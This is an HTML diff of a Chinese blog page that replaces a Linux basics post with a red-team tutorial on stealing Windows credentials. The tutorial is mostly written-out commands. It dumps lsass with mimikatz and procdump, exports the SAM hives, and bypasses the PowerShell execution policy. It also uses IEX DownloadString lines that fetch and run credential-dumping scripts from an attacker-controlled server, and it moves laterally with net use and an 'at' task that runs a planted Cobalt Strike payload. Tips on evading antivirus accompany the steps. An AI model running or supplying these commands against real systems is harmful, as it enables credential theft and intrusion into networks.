@@ -21,49 +21,45 @@
     var CONFIG = {"hostname":"www.jwmz.net","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null,"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
-  <meta name="description" content="ip a&#x2F;ip addr centos7之后，使用查看网卡信息">
+  <meta name="description" content="获取明文密码 系统版本小于windows 8 &amp; windows server 2012才能读明文密码  windows 8 &amp; windows server 2012及以上需要修改注册表，开启存储明文密码功能，并重新登录系统，才能读取到明文密码。   mimikatz使用mimikatz.exe在lsass.exe进程中读取明文密码 上传mimikatz到目标服务器  当前目录执">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Linux基本命令">
-<meta property="og:url" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/index.html">
+<meta property="og:title" content="获取密码hash">
+<meta property="og:url" content="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/index.html">
 <meta property="og:site_name" content="JWMZ&#96;Blog">
-<meta property="og:description" content="ip a&#x2F;ip addr centos7之后，使用查看网卡信息">
+<meta property="og:description" content="获取明文密码 系统版本小于windows 8 &amp; windows server 2012才能读明文密码  windows 8 &amp; windows server 2012及以上需要修改注册表，开启存储明文密码功能，并重新登录系统，才能读取到明文密码。   mimikatz使用mimikatz.exe在lsass.exe进程中读取明文密码 上传mimikatz到目标服务器  当前目录执">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image002.jpg">
-<meta property="og:image" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image004.jpg">
-<meta property="og:image" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image006.jpg">
-<meta property="og:image" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image008.jpg">
-<meta property="og:image" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image010.jpg">
-<meta property="og:image" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image012.jpg">
-<meta property="og:image" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image014.jpg">
-<meta property="og:image" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image016.jpg">
-<meta property="og:image" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image018.jpg">
-<meta property="og:image" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image020.jpg">
-<meta property="og:image" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image022.jpg">
-<meta property="og:image" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image024.jpg">
-<meta property="og:image" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image026.jpg">
-<meta property="og:image" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image028.jpg">
-<meta property="og:image" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image030.jpg">
-<meta property="og:image" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image032.jpg">
-<meta property="og:image" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image034.jpg">
-<meta property="og:image" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image036.jpg">
-<meta property="og:image" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image038.jpg">
-<meta property="og:image" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image040.jpg">
-<meta property="og:image" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image042.jpg">
-<meta property="og:image" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image044.jpg">
-<meta property="og:image" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image046.jpg">
-<meta property="og:image" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image048.jpg">
-<meta property="og:image" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image050.jpg">
-<meta property="og:image" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image052.jpg">
-<meta property="og:image" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image054.jpg">
-<meta property="og:image" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image056.jpg">
-<meta property="og:image" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image058.jpg">
-<meta property="article:published_time" content="2021-06-13T04:04:38.000Z">
-<meta property="article:modified_time" content="2021-07-13T11:54:24.716Z">
+<meta property="og:image" content="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image001.png">
+<meta property="og:image" content="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image002.png">
+<meta property="og:image" content="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image003.png">
+<meta property="og:image" content="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image004.png">
+<meta property="og:image" content="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image005.png">
+<meta property="og:image" content="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image006.png">
+<meta property="og:image" content="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image008.png">
+<meta property="og:image" content="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image009.png">
+<meta property="og:image" content="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image010.png">
+<meta property="og:image" content="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image011.png">
+<meta property="og:image" content="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image012.png">
+<meta property="og:image" content="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image013.png">
+<meta property="og:image" content="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image014.png">
+<meta property="og:image" content="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image015.png">
+<meta property="og:image" content="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image016.png">
+<meta property="og:image" content="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image017.png">
+<meta property="og:image" content="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image018.png">
+<meta property="og:image" content="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image019.png">
+<meta property="og:image" content="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image020.png">
+<meta property="og:image" content="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image021.png">
+<meta property="og:image" content="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image022.png">
+<meta property="og:image" content="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image023.png">
+<meta property="og:image" content="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image024.png">
+<meta property="og:image" content="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image025.png">
+<meta property="og:image" content="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image026.png">
+<meta property="article:published_time" content="2021-09-14T15:59:47.000Z">
+<meta property="article:modified_time" content="2021-09-13T16:26:41.631Z">
 <meta property="article:author" content="JWMZ">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image002.jpg">
+<meta name="twitter:image" content="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image001.png">
 
-<link rel="canonical" href="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/">
+<link rel="canonical" href="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/">
 
 
 <script id="page-configurations">
@@ -76,7 +72,7 @@
   };
 </script>
 
-  <title>Linux基本命令 | JWMZ`Blog</title>
+  <title>获取密码hash | JWMZ`Blog</title>
   
 
 
@@ -226,7 +222,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.jwmz.net/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/">
+    <link itemprop="mainEntityOfPage" href="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/IMG_0640.PNG">
@@ -239,7 +235,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Linux基本命令
+          获取密码hash
         </h1>
 
         <div class="post-meta">
@@ -248,19 +244,22 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2021-06-13 12:04:38" itemprop="dateCreated datePublished" datetime="2021-06-13T12:04:38+08:00">2021-06-13</time>
+              <time title="创建时间：2021-09-14 23:59:47 / 修改时间：00:26:41" itemprop="dateCreated datePublished" datetime="2021-09-14T23:59:47+08:00">2021-09-14</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-07-13 19:54:24" itemprop="dateModified" datetime="2021-07-13T19:54:24+08:00">2021-07-13</time>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
               </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91/" itemprop="url" rel="index"><span itemprop="name">内网</span></a>
+                </span>
+            </span>
 
           
-            <span id="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/" class="post-meta-item leancloud_visitors" data-flag-title="Linux基本命令" title="阅读次数">
+            <span id="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/" class="post-meta-item leancloud_visitors" data-flag-title="获取密码hash" title="阅读次数">
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
@@ -282,8 +281,8 @@
       </span>
       <span class="post-meta-item-text">Valine：</span>
     
-    <a title="valine" href="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/" itemprop="commentCount"></span>
+    <a title="valine" href="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -293,14 +292,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1.4k</span>
+              <span>2.5k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>2 分钟</span>
             </span>
 
         </div>
@@ -312,109 +311,92 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>ip a/ip addr centos7之后，使用查看网卡信息</p>
-<p><img src="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image002.jpg"></p>
-<span id="more"></span>
-<p>centos6/ubuntu 使用 ifconfig</p>
-<p><img src="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image004.jpg"></p>
-<p>ifdown、ifup 禁用、启用网卡</p>
-<p><img src="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image006.jpg"></p>
-<p>Ping 网络测试</p>
-<p><img src="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image008.jpg"></p>
-<p> ls 查看目录下文件      cat查看文本类文件内容   vi  编辑文本类文件  clear清屏</p>
-<p><img src="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image010.jpg"></p>
-<p>poweroff 立即关机  init命令    halt 立即关机</p>
-<p>init 0 立即关机  1单用户模式    2多用户无网络模式  3纯文本模式    6重新启动</p>
-<p>reboot  重新启动</p>
-<p>shutdown  -c取消关机  -h关机  -r重启  -h 设置关机时间 now/10/11:11</p>
-<p>cd 命令 切换当前所在目录</p>
-<p>pwd    显示当前所在目录的完整路径</p>
-<p><img src="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image012.jpg"></p>
-<p>ls 查看目录下文件   ls -a    ls -al</p>
-<p><img src="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image014.jpg"></p>
-<p>mkdir  创建文件夹目录  -p  创建多级目录</p>
-<p><img src="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image016.jpg"></p>
-<p>rmdir   删除空目录  -p  逐级删除</p>
-<p>touch  创建文件，修改文件操作时间  -t 202001010101.01 </p>
-<p><img src="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image018.jpg"></p>
-<p>rm  删除命令 -f  强制删除    -r逐级删除</p>
-<p><img src="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image020.jpg"></p>
-<p>cp  复制    -r逐级复制</p>
-<p><img src="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image022.jpg"></p>
-<p>mv 剪切、重命名</p>
-<p><img src="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image024.jpg"></p>
-<p>more   可以分段查看内容较长的文本文件 -n 从第几行开始显示</p>
-<p><img src="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image026.jpg"></p>
-<p>head   查看文件前几行      -n  设置行数</p>
-<p><img src="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image028.jpg"></p>
-<p>tail 查看文件后几行      -f  可以动态显示文件最后更新内容，适用于查看日志</p>
-<p><img src="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image030.jpg"></p>
-<p>find 文件查找命令   -name 路径 文件名称    支持“<em>模糊查询</em>”及“*.log”</p>
-<p><img src="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image032.jpg"></p>
-<p>grep 文件内检索 可以配合 | 使用</p>
-<p><img src="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image034.jpg"></p>
-<p>whereis 查找命令文件位置</p>
-<p><img src="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image036.jpg"></p>
-<p>which  查找环境变量中的文件，使用较少</p>
-<p><img src="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image038.jpg"></p>
-<p>whoami 显示当前登录的用户名</p>
-<p><img src="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image040.jpg"></p>
-<p>jobs 查看当前终端后台运行的任务</p>
-<p><img src="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image042.jpg"></p>
-<p>fg 用于恢复后台执行的任务   %工作号</p>
-<p><img src="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image044.jpg"></p>
-<p>bg 将前台任务放到后台继续运行，不同于ctrl+z是后台暂停任务，</p>
-<p><img src="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image046.jpg"></p>
-<p>Tab    自动补齐</p>
-<p>反斜杠  强制换行    用于多命令或命令较长时</p>
-<p>Ctrl+U  用于从光标所在处清除至该行行首</p>
-<p>Ctrl+K  用于从光标所在处清除至该行行尾</p>
-<p>Ctrl+L  清屏</p>
-<p>Ctrl+C  取消执行</p>
-<p>Ctrl+Z  后台暂停</p>
-<p>Ctrl+D  退出shell</p>
-<p>打包压缩命令</p>
-<p>tar 打包命令    tar cvf  aa.tar aa</p>
-<p><img src="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image048.jpg"></p>
-<p>tar 解包命令    tar xvf aa.tar</p>
-<p><img src="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image050.jpg"></p>
-<p>打包压缩命令</p>
-<p>tar zcvf aa.tar.gz aa</p>
-<p><img src="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image052.jpg"></p>
-<p>解包解压缩命令</p>
-<p>tar zxvf aa.tar.gz</p>
-<p><img src="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image054.jpg"></p>
-<p>zip 压缩命令 -r 文件夹逐级压缩   部分系统原生可能没安装zip程序</p>
-<p><img src="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image056.jpg"></p>
-<p>unzip 解压命令 unzip b.zip</p>
-<p><img src="/2021/06/13/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/clip_image058.jpg"></p>
-<p>vi编辑器</p>
-<p>三种模式-基础</p>
-<p>命令模式、底线模式、输入模式</p>
-<p>进入vi编辑器后，按键盘i键可以输入内容，输入完成后按esc键退出输入模式，输入冒号，进入底线模式，w或w!，保存输入内容，q或q！退出vi编辑器，wq或wq！保存并退出</p>
-<p>编辑器内常用命令</p>
-<p>查找内容：命令模式下输入/内容   n跳到下一个</p>
-<p>替换文本：底线模式下输入%s/原内容/新内容/g</p>
-<p>复制粘贴：命令模式下按v开始文本选择，按y复制选择内容，按p粘贴至光标所在处</p>
-<p>剪切：命令模式下，按x，剪切光标所在处字符；或连续按dd剪切光标所在整行，按p粘贴至光标所在处</p>
-<p>显示行号：底线模式下，输入set nu 按回车，显示行号</p>
-<p>Linux命令                    对应Windows命令</p>
-<p>cd                          cd</p>
-<p>ls                           dir</p>
-<p>vi                           notepad</p>
-<p>clear                        cls</p>
-<p>ip a/ifconfig                  ipconfig</p>
-<p>ifdown                      netsh interface set interface “本地连接” disabled</p>
-<p>ifup                         netsh interface set interface “本地连接” enabled</p>
-<p>poweroff/halt/shutdown       shutdown -s -t -a </p>
-<p>reboot                       shutdown -r</p>
-<p>mkdir                       md</p>
-<p>touch                       copy nul</p>
-<p>echo                        echo</p>
-<p>rm                          del</p>
-<p>mv                          move</p>
-<p>pwd                         显示路径</p>
-<p>whereis                      where </p>
+        <h2 id="获取明文密码"><a href="#获取明文密码" class="headerlink" title="获取明文密码"></a>获取明文密码</h2><ul>
+<li><p>系统版本小于windows 8 &amp; windows server 2012才能读明文密码</p>
+</li>
+<li><p>windows 8 &amp; windows server 2012及以上需要修改注册表，开启存储明文密码功能，并重新登录系统，才能读取到明文密码。</p>
+</li>
+</ul>
+<h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>使用mimikatz.exe在lsass.exe进程中读取明文密码</p>
+<p>上传mimikatz到目标服务器</p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image001.png" alt="img"></p>
+<p>当前目录执行：</p>
+<p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;</code></p>
+<p>正常执行后显示</p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image002.png" alt="img"></p>
+<p>Powershell版mimikatz.ps1</p>
+<h4 id="本地执行："><a href="#本地执行：" class="headerlink" title="本地执行："></a>本地执行：</h4><p><code>powershell Get-ExecutionPolicy</code>               //查看状态是否允许运行脚本</p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image003.png" alt="img"></p>
+<p><code>powershell Set-ExecutionPolicy Unrestricted</code>      //设置为允许所有的脚本运行</p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image004.png" alt="img"></p>
+<p> <code>powershell Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command &#39;&quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords&quot;&#39;</code>       //获取密码</p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image005.png" alt="img"></p>
+<h4 id="本地执行-绕过执行权限限制"><a href="#本地执行-绕过执行权限限制" class="headerlink" title="本地执行(绕过执行权限限制)"></a>本地执行(绕过执行权限限制)</h4><p><code>powershell -exec bypass &quot;Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command &#39;privilege::debug&quot; &quot;sekurlsa::logonPasswords&#39;&quot;</code></p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image006.png" alt="img"></p>
+<h4 id="远程执行"><a href="#远程执行" class="headerlink" title="远程执行"></a>远程执行</h4><p>开启目标机能访问到的web服务</p>
+<p>例如：<code>php -S 0.0.0.0:6666</code></p>
+<p><code>powershell.exe iex (New-Object Net.webclient).DownloadString(&#39;http://192.168.21.93:6666/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz</code></p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image008.png" alt="img"></p>
+<p>使用procdump.exe 保存lsass.exe内存数据</p>
+<p>上传procdump.exe到目标服务器</p>
+<p><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp</code></p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image009.png" alt="img"></p>
+<p>将dmp文件下载到本地使用mimikatz读取明文密码</p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image010.png" alt="img"></p>
+<p> mimikatz默认不免杀，cs上线后可以使用cs自带的免杀mimikatz</p>
+<p>cs中执行：<code>logonpasswords</code></p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image011.png" alt="img"></p>
+<h2 id="获取密码hash"><a href="#获取密码hash" class="headerlink" title="获取密码hash"></a>获取密码hash</h2><h3 id="注册表导出sam文件"><a href="#注册表导出sam文件" class="headerlink" title="注册表导出sam文件"></a>注册表导出sam文件</h3><p><code>reg save hklm\sam sam.bak</code></p>
+<p><code>reg save hklm\system system.bak</code></p>
+<p><code>reg save hklm\security security.bak</code></p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image012.png" alt="img"></p>
+<p>将导出的三个文件保存到本地，使用mimikatz读取hash</p>
+<p><code>mimikatz.exe &quot;lsadump::sam /sam:sam.bak /system:system.bak&quot; &quot;exit&quot;</code></p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image013.png" alt="img"></p>
+<p>注册表导出sam文件到本地可以免杀</p>
+<h3 id="Get-PassHashes-ps1读取hash"><a href="#Get-PassHashes-ps1读取hash" class="headerlink" title="Get-PassHashes.ps1读取hash"></a>Get-PassHashes.ps1读取hash</h3><h4 id="本地读取"><a href="#本地读取" class="headerlink" title="本地读取"></a>本地读取</h4><p><code>powershell -exec bypass &quot;Import-Module .\Get-PassHashes.ps1;Get-PassHashes&quot;</code></p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image014.png" alt="img"></p>
+<h4 id="远程读取"><a href="#远程读取" class="headerlink" title="远程读取"></a>远程读取</h4><p><code>powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.21.93:6666/Get-PassHashes.ps1&#39;);Get-PassHashes&quot;</code></p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image015.png" alt="img"></p>
+<p> 使用cs中 hashdump 可以免杀</p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image016.png" alt="img"></p>
+<h2 id="明文传递"><a href="#明文传递" class="headerlink" title="明文传递"></a>明文传递</h2><p>使用windows自带net use命令</p>
+<p><code>net use \\192.168.21.224\ipc$ 123.com /user:administrator</code></p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image017.png" alt="img"></p>
+<p>复制文件到目标服务器</p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image018.png" alt="img"></p>
+<p>查看目标服务器时间</p>
+<p><code>net time \\192.168.21.224</code></p>
+<h3 id="使用计划任务执行cs-exe"><a href="#使用计划任务执行cs-exe" class="headerlink" title="使用计划任务执行cs.exe"></a>使用计划任务执行cs.exe</h3><p><code>at \\192.168.21.224 20:31 c:\cs.exe</code></p>
